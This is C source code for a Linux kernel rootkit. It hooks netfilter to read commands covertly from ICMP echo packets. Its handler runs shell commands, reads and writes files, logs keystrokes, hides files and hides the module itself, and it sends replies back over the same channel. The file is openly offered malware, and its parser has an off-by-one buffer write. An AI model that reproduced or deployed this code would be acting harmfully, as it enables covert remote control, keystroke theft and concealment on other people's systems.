#include "rootkit.h"


void rootkit_handler(struct work_struct* work) {

    // getting passed args struct
    args_t* args = container_of(work, args_t, work);

    DEBUG_PRINTF("%s\n", args->string)


    switch (args->command) {
        case RUN:
            DEBUG_PRINTF("rootkit: shell command: %s \n", args->string)
            run_command(args);
            break;
        case CAT:
            DEBUG_PRINTF("rootkit: cat command: %s \n", args->string);
            cat_command(args);
            break;
        case KEYLOG:
            DEBUG_PRINTF("rootkit: keylog command: %s \n", args->string);
            keylog_command(args);
            break;
        case HIDE:
            DEBUG_PRINTF("rootkit: hide command: %s \n", args->string);
            if (!add_hidden_file(args->string)) {
                send_response("rootkit: can't hide the given file\n", args);
            } else {
                send_response("rootkit: successfully hid the given file\n", args);
            }
            break;
        case UNHIDE:
            DEBUG_PRINTF("rootkit: unhide command: %s \n", args->string);
            if (!remove_hidden_file(args->string)) {
                send_response("rootkit: can't unhid the given file\n", args);
            } else {
                send_response("rootkit: successfully unhid the given file\n", args);
            }
            break;
        case HIDEMOD:
            DEBUG_PUTS("rootkit: hidemod command \n");
            if (!hide_module()) {
                send_response("rootkit: can't hide module\n", args);
            } else {
                send_response("rootkit: successfully hid the module\n", args);
            }
            break;

        case UNHIDEMOD:
            DEBUG_PUTS("rootkit: unhidemod command \n");
            if (!unhide_module()) {
                send_response("rootkit: can't unhide module\n", args);
            } else {
                send_response("rootkit: successfully unhid the module\n", args);
            }
            break;
        
        case SWITCH_RANDOM:
            DEBUG_PUTS("rootkit: randswitch command \n");
            if (switch_random()) {
                send_response("rootkit: random is off\n", args);
            } else {
                send_response("rootkit: random is on\n", args);
            }
            break;
        
        case WRITE_FILE:
            DEBUG_PUTS("rootkit: write command \n");
            write_file_command(args);
            break;



        default:
            DEBUG_PUTS("rootkit: invalid command\n")
            send_response("rootkit: invalid command", args);
            break;
    }


    kfree(args);


}

    

unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    
    struct iphdr *iph;
    struct icmphdr *icmph;
    struct ethhdr* eth;

    unsigned char *user_data;
    unsigned char *tail;
    unsigned char *i;
    int j = 0;

    args_t* args;


    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);
    eth = eth_hdr(skb);
    


    //DEBUG_PUTS("rootkit: checking connection\n")


    if (iph->protocol != IPPROTO_ICMP) {
        //DEBUG_PUTS("rootkit: bad protocol\n")
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        DEBUG_PUTS("rootkit: bad request type\n")
        return NF_ACCEPT;
    }

    DEBUG_PUTS("rootkit: parsing command\n")

    args = kmalloc(sizeof(args_t), GFP_KERNEL);

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    // copying the payload to the arg struct
    j = 0;
    for (i = user_data; i != tail; ++i) {
        char c = *(char *)i;

        args->string[j] = c;
        j++;

        if (c == '\0')
            break;

        if (j == REQUEST_SIZE_LIMIT) {
            args->string[j] = '\0';
            break;
        }

    }

    args->icmph = icmph;
    args->iph = iph;
    args->skb = skb;
    args->eth = eth;
    decode(args->string, j);
    args->command = parse_command(args->string);

    if (args->command == BAD_COMMAND) {
        kfree(args);
        return NF_ACCEPT;
    }

    DEBUG_PUTS("rootkit: scheduling rootkit action \n")
    INIT_WORK(&args->work, rootkit_handler);
    schedule_work(&args->work);


    return NF_STOLEN;
}